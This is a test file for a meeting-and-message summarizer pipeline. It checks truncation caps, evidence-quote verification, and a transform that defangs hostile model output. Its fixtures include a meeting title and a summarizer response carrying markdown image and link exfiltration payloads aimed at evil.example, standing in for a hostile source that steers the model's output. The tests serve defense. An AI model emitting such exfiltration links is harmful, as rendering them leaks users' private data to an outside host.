import { test, expect, describe } from "bun:test";
import { untrusted, unwrap } from "../src/trust.ts";
import type { Bundle } from "../src/domain.ts";
import { plan, renderBundle, type PlanDeps } from "../src/plan.ts";
import type { SummarizerOutput } from "../src/brief-contract.ts";

// The Planner is tested through its injected `deps.summarize` seam — a fake that
// records the request it was handed and returns a canned Brief. No mock.module(),
// no network call: the Planner's composition (task selection, envelope attachment)
// is asserted against real behavior.
const CANNED: SummarizerOutput = {
  summary: "You have one meeting and one open task.",
  items: [{ kind: "commitment", summary: "Board meeting", when: "Thu 9am", evidence: [] }],
};

function fakeSummarizer(output: SummarizerOutput = CANNED) {
  const calls: Array<{ instructions: string; data: string }> = [];
  const summarize = (async (input: { instructions: string; data: string }) => {
    calls.push({ instructions: input.instructions, data: input.data });
    return output;
  }) as unknown as PlanDeps["summarize"];
  return { summarize, calls };
}

const window = { from: "2026-07-06T00:00:00.000Z", to: "2026-07-13T00:00:00.000Z" };

// renderBundle returns {data, index} (the ref index feeds evidence resolution, #54);
// these tests assert on the rendered text.
const renderText = (b: Bundle) => renderBundle(b).data;

function bundle(items: Bundle["items"]): Bundle {
  return { window, sources: [{ source: "graph", itemCount: items.length }], items };
}

const item = {
  source: "graph",
  kind: "event",
  timestamp: "2026-07-07T09:00:00Z",
  bucket: "recent",
  id: untrusted("1"),
  title: untrusted("Board meeting"),
} as const;

describe("renderBundle", () => {
  test("groups by bucket and unwraps untrusted fields", () => {
    const rendered = renderText(
      bundle([
        {
          source: "graph",
          kind: "event",
          timestamp: "2026-07-07T09:00:00Z",
          bucket: "recent",
          id: untrusted("1"),
          title: untrusted("Board meeting"),
          extras: untrusted({ organizer: "Anna", attendees: ["Bo", "Cy"] }),
        },
      ]),
    );
    expect(rendered).toContain("RECENT");
    expect(rendered).toContain("title: Board meeting");
    expect(rendered).toContain("organizer: Anna");
    expect(rendered).toContain("attendees: Bo, Cy");
  });
});

describe("renderBundle — length caps", () => {
  test("truncates an oversized rendered field with a visible marker at 2,000 chars", () => {
    const oversizedTitle = "x".repeat(2_500);
    const rendered = renderText(
      bundle([
        {
          source: "graph",
          kind: "event",
          timestamp: "2026-07-07T09:00:00Z",
          bucket: "recent",
          id: untrusted("4"),
          title: untrusted(oversizedTitle),
          url: untrusted(`https://example.test/${"y".repeat(2_500)}`),
          extras: untrusted({ body: "z".repeat(2_500) }),
        },
      ]),
    );

    expect(rendered).toContain("…[truncated]");
    // title line: "  title: " + 2000 x's + marker, nothing beyond.
    const titleLine = rendered.split("\n").find((l) => l.startsWith("  title:"))!;
    expect(titleLine).toBe(`  title: ${"x".repeat(2_000)}…[truncated]`);
    expect(rendered).not.toContain("x".repeat(2_001));

    const urlLine = rendered.split("\n").find((l) => l.startsWith("  url:"))!;
    expect(urlLine.endsWith("…[truncated]")).toBe(true);

    const bodyLine = rendered.split("\n").find((l) => l.startsWith("  body:"))!;
    expect(bodyLine.endsWith("…[truncated]")).toBe(true);
  });

  test("leaves a field at or under the cap untouched", () => {
    const title = "x".repeat(2_000);
    const rendered = renderText(
      bundle([
        {
          source: "graph",
          kind: "event",
          timestamp: "2026-07-07T09:00:00Z",
          bucket: "recent",
          id: untrusted("5"),
          title: untrusted(title),
        },
      ]),
    );
    expect(rendered).toContain(`  title: ${title}`);
    expect(rendered).not.toContain("…[truncated]");
  });
});

describe("plan", () => {
  test("short-circuits an empty bundle with no model call", async () => {
    const { summarize, calls } = fakeSummarizer();
    const brief = await plan(bundle([]), false, undefined, { summarize });
    expect(brief.summary).toBe("");
    expect(brief.items).toEqual([]);
    expect(brief.envelope.sources).toEqual([{ source: "graph", itemCount: 0 }]);
    expect(calls).toHaveLength(0); // the empty-bundle short-circuit skips the Summarizer entirely
  });

  test("attaches the trusted envelope and the Summarizer's output", async () => {
    const { summarize } = fakeSummarizer();
    const brief = await plan(
      bundle([
        {
          source: "graph",
          kind: "event",
          timestamp: "2026-07-07T09:00:00Z",
          bucket: "recent",
          id: untrusted("1"),
          title: untrusted("Board meeting"),
        },
      ]),
      false,
      undefined,
      { summarize },
    );
    expect(brief.envelope.window).toEqual(window);
    expect(brief.summary).toContain("meeting");
    expect(brief.items[0]!.kind).toBe("commitment");
  });

  test("maps windowIsPast=false to the planning task", async () => {
    const { summarize, calls } = fakeSummarizer();
    await plan(bundle([item]), false, undefined, { summarize });
    expect(calls[0]!.instructions).toContain("plan my week");
  });

  test("maps windowIsPast=true to the retrospective task", async () => {
    const { summarize, calls } = fakeSummarizer();
    await plan(bundle([item]), true, undefined, { summarize });
    expect(calls[0]!.instructions).toContain("look-back");
    expect(calls[0]!.instructions).toContain("retrospective");
  });

  test("appends user guidance to the task instructions", async () => {
    const { summarize, calls } = fakeSummarizer();
    await plan(bundle([item]), false, "focus on the launch", { summarize });
    expect(calls[0]!.instructions).toContain("Additional guidance from the user:");
    expect(calls[0]!.instructions).toContain("focus on the launch");
  });

  test("renders the bundle into the Summarizer's untrusted data string", async () => {
    const { summarize, calls } = fakeSummarizer();
    await plan(bundle([item]), false, undefined, { summarize });
    expect(calls[0]!.data).toContain("title: Board meeting");
  });
});

describe("plan — defang transform", () => {
  // A source item whose title itself carries the hostile markdown/URL text, so the
  // evidence quote below is a genuine verbatim substring of the rendered bundle (it
  // must survive evidence-quote verification once that lands, not just the
  // defang transform). This models a real hostile source, e.g. a meeting title
  // crafted for render-time exfiltration — not a fabricated quote.
  const hostileItem = {
    source: "graph",
    kind: "event",
    timestamp: "2026-07-07T09:00:00Z",
    bucket: "recent",
    id: untrusted("2"),
    title: untrusted("click here ![img](https://evil.example/?q=quote)"),
  } as const;

  // A hostile summarizer output carrying markdown image/link exfiltration vectors
  // and bare URLs in every string field. `plan()` must defang all of it before the
  // Brief is emitted, since the Brief may land on a markdown-rendering surface.
  const HOSTILE: SummarizerOutput = {
    summary: "Status: ![](https://evil.example/?q=summary) all good.",
    items: [
      {
        kind: "task",
        summary: "Reply to thread [details](https://evil.example/?q=item-summary).",
        when: "Thu 9am, see https://evil.example/?q=when",
        evidence: [{ ref: 1, quote: "click here ![img](https://evil.example/?q=quote)" }],
      },
    ],
  };

  test("strips markdown image/link wrappers to visible text and neutralizes bare URLs everywhere", async () => {
    const { summarize } = fakeSummarizer(HOSTILE);
    const brief = await plan(bundle([hostileItem]), false, undefined, { summarize });

    expect(brief.summary).toBe("Status:  all good.");
    expect(brief.summary).not.toContain("https://");
    expect(brief.summary).not.toContain("![");

    const outItem = brief.items[0]!;
    expect(outItem.summary).toBe("Reply to thread details.");
    expect(outItem.summary).not.toContain("http");

    expect(outItem.when).toBe("Thu 9am, see hxxps://evil.example/?q=when");

    expect(outItem.evidence[0]!.quote).toBe("click here img");
    expect(outItem.evidence[0]!.quote).not.toContain("http");
  });

  test("neutralizes bare http:// and https:// case-insensitively when not markdown-wrapped", async () => {
    const output: SummarizerOutput = {
      summary: "See HTTPS://Evil.Example and http://other.example for details.",
      items: [],
    };
    const { summarize } = fakeSummarizer(output);
    const brief = await plan(bundle([item]), false, undefined, { summarize });
    expect(brief.summary).toBe("See hxxps://Evil.Example and hxxp://other.example for details.");
  });

  test("passes honest text with no URLs through byte-identical", async () => {
    const output: SummarizerOutput = {
      summary: "You have one meeting and one open task this week.",
      items: [
        {
          kind: "commitment",
          summary: "Board meeting on Thursday.",
          when: "Thu 9am",
          evidence: [{ ref: 1, quote: "Board meeting" }],
        },
      ],
    };
    const { summarize } = fakeSummarizer(output);
    const brief = await plan(bundle([item]), false, undefined, { summarize });

    expect(brief.summary).toBe(output.summary);
    expect(brief.items[0]!.summary).toBe(output.items[0]!.summary);
    expect(brief.items[0]!.when).toBe(output.items[0]!.when);
    expect(brief.items[0]!.evidence[0]!.quote).toBe(output.items[0]!.evidence[0]!.quote);
  });
});

describe("plan — evidence-quote verification", () => {
  // A title with irregular internal spacing so a line-wrapped quote (below) still
  // matches after whitespace normalization.
  const verifyItem = {
    source: "graph",
    kind: "event",
    timestamp: "2026-07-07T09:00:00Z",
    bucket: "recent",
    id: untrusted("3"),
    title: untrusted("Board meeting for Q3 planning"),
  } as const;

  test("drops a fabricated quote but keeps a verbatim quote and a whitespace-wrapped honest quote", async () => {
    const output: SummarizerOutput = {
      summary: "One meeting worth noting.",
      items: [
        {
          kind: "commitment",
          summary: "Board meeting",
          when: "Thu 9am",
          evidence: [
            { ref: 1, quote: "Board meeting for Q3 planning" }, // verbatim
            { ref: 1, quote: "This was never said by anyone." }, // fabricated
            { ref: 1, quote: "Board meeting\n  for   Q3\nplanning" }, // honest, wrapped
          ],
        },
      ],
    };
    const { summarize } = fakeSummarizer(output);
    const brief = await plan(bundle([verifyItem]), false, undefined, { summarize });

    // The item survives even though one evidence entry was dropped.
    expect(brief.items).toHaveLength(1);
    const quotes = brief.items[0]!.evidence.map((e) => e.quote);
    expect(quotes).toContain("Board meeting for Q3 planning");
    expect(quotes).toContain("Board meeting for Q3 planning"); // wrapped quote normalizes to the same text
    expect(quotes).not.toContain("This was never said by anyone.");
    expect(brief.items[0]!.evidence).toHaveLength(2);
  });

  // ── per-item resolution (#54) ──
  //
  // Verification used to be a substring test against the WHOLE rendered bundle, so a
  // quote passed regardless of which item the model attached it to. It now runs against
  // the cited item's own rendered text. That is deliberately stricter: a real quote
  // citing the wrong item is dropped rather than passing. The pay-off is that a
  // surviving quote and its code-copied attribution cannot disagree.
  describe("resolves each quote against the item it cites, not the whole bundle", () => {
    const first = {
      source: "slack",
      kind: "message",
      timestamp: "2026-07-07T09:00:00Z",
      bucket: "recent",
      id: untrusted("m1"),
      title: untrusted("Sounds good, I'll take a look this afternoon"),
      attribution: untrusted({ where: "#flow-mgmt", who: ["Ada Lovelace"], relationship: "mentions" }),
    } as const;
    const second = {
      source: "graph",
      kind: "message",
      timestamp: "2026-07-07T11:00:00Z",
      bucket: "recent",
      id: untrusted("m2"),
      title: untrusted("Q3 budget figures — need your numbers by Friday"),
      attribution: untrusted({ where: "Inbox", who: ["Kari Nord"] }),
    } as const;

    test("copies the cited item's attribution and code-fills source", async () => {
      const output: SummarizerOutput = {
        summary: "s",
        items: [
          {
            kind: "task",
            summary: "Ada is reviewing",
            evidence: [{ ref: 1, quote: "take a look this afternoon" }],
          },
        ],
      };
      const { summarize } = fakeSummarizer(output);
      const brief = await plan(bundle([first, second]), false, undefined, { summarize });

      expect(brief.items[0]!.evidence).toEqual([
        {
          source: "slack/message",
          where: "#flow-mgmt",
          who: ["Ada Lovelace"],
          quote: "take a look this afternoon",
        },
      ]);
    });

    // #86: a large meeting used to kill the whole run — the code-filled `who` exceeded
    // the contract's cap and the final parse threw after the model call was spent.
    // Attribution is now clamped as it is filled, so the Brief survives.
    test("clamps an oversized who list to the contract cap instead of throwing", async () => {
      const crowded = {
        ...first,
        attribution: untrusted({
          where: "#flow-mgmt",
          who: Array.from({ length: 20 }, (_, i) => `Person ${i + 1}`),
        }),
      };
      const output: SummarizerOutput = {
        summary: "s",
        items: [
          {
            kind: "task",
            summary: "All-hands",
            evidence: [{ ref: 1, quote: "take a look this afternoon" }],
          },
        ],
      };
      const { summarize } = fakeSummarizer(output);
      const brief = await plan(bundle([crowded]), false, undefined, { summarize });

      const who = brief.items[0]!.evidence[0]!.who!;
      expect(who).toHaveLength(8);
      // Most-salient-first, so the clamp keeps the head of the list.
      expect(who[0]).toBe("Person 1");
      expect(who[7]).toBe("Person 8");
    });

    test("truncates an over-long name and where label to the label cap", async () => {
      const longName = "N".repeat(150);
      const wordy = {
        ...first,
        attribution: untrusted({ where: "W".repeat(150), who: [longName] }),
      };
      const output: SummarizerOutput = {
        summary: "s",
        items: [
          {
            kind: "task",
            summary: "Long name",
            evidence: [{ ref: 1, quote: "take a look this afternoon" }],
          },
        ],
      };
      const { summarize } = fakeSummarizer(output);
      const brief = await plan(bundle([wordy]), false, undefined, { summarize });

      const entry = brief.items[0]!.evidence[0]!;
      expect(entry.who).toEqual(["N".repeat(120)]);
      expect(entry.where).toBe("W".repeat(120));
    });

    test("drops a real quote that cites the wrong item (the behaviour change)", async () => {
      const output: SummarizerOutput = {
        summary: "s",
        items: [
          {
            kind: "task",
            // Verbatim from item 2, but attributed to item 1. Under the old
            // whole-bundle check this passed; now it cannot borrow item 1's caption.
            summary: "Budget numbers",
            evidence: [{ ref: 1, quote: "need your numbers by Friday" }],
          },
        ],
      };
      const { summarize } = fakeSummarizer(output);
      const brief = await plan(bundle([first, second]), false, undefined, { summarize });

      expect(brief.items).toHaveLength(1); // the item survives, its evidence does not
      expect(brief.items[0]!.evidence).toEqual([]);
    });

    test("drops an entry citing a ref that does not exist", async () => {
      const output: SummarizerOutput = {
        summary: "s",
        items: [
          {
            kind: "fyi",
            summary: "Out of range",
            evidence: [
              { ref: 99, quote: "take a look this afternoon" },
              { ref: 0, quote: "take a look this afternoon" },
              { ref: -1, quote: "take a look this afternoon" },
            ],
          },
        ],
      };
      const { summarize } = fakeSummarizer(output);
      const brief = await plan(bundle([first, second]), false, undefined, { summarize });

      expect(brief.items[0]!.evidence).toEqual([]);
    });

    test("omits where/who when the cited item carries no attribution", async () => {
      const bare = { ...first, attribution: undefined };
      const output: SummarizerOutput = {
        summary: "s",
        items: [{ kind: "fyi", summary: "x", evidence: [{ ref: 1, quote: "Sounds good" }] }],
      };
      const { summarize } = fakeSummarizer(output);
      const brief = await plan(bundle([bare]), false, undefined, { summarize });

      expect(brief.items[0]!.evidence).toEqual([{ source: "slack/message", quote: "Sounds good" }]);
    });

    // Refs are assigned in render order across the whole bundle, and the bundle renders
    // standing → recent → upcoming — so numbering crosses bucket-section boundaries.
    test("numbers items across buckets in render order, not per bucket", async () => {
      const standing = { ...second, bucket: "standing" as const, title: untrusted("Standing item") };
      const rendered = renderBundle(bundle([first, standing]));
      expect(rendered.data).toContain("- [1] [graph/message]"); // standing renders first
      expect(rendered.data).toContain("- [2] [slack/message]");
      expect(unwrap(rendered.index.get(1)!.item.title)).toBe("Standing item");
    });

    test("renders attribution for the model alongside extras", () => {
      const rendered = renderBundle(bundle([first]));
      expect(rendered.data).toContain("  where: #flow-mgmt");
      expect(rendered.data).toContain("  who: Ada Lovelace");
      expect(rendered.data).toContain("  relationship: mentions");
    });
  });
});
